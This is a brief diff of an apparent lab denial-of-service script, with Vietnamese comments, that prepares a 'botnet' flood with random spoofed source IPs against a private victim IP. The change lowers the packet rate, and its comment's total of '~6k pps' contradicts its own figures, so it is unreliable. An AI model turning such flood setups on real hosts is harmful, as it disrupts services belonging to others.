@@ -8,7 +8,7 @@
 # =============================================================
 
 VICTIM_IP="10.10.2.2"
-DEFAULT_PPS="u100" # u100 = wait 100 microseconds -> ~10,000 pps mỗi tiến trình
+DEFAULT_PPS="u10000" # u10000 = wait 10,000 microseconds -> ~100 pps mỗi tiến trình (5 luồng = 500 pps + overhead = ~6k pps total)
 
 echo "[*] [ATTACKER] Đang chuẩn bị đạn dược Botnet (Random Source IP)..."
 
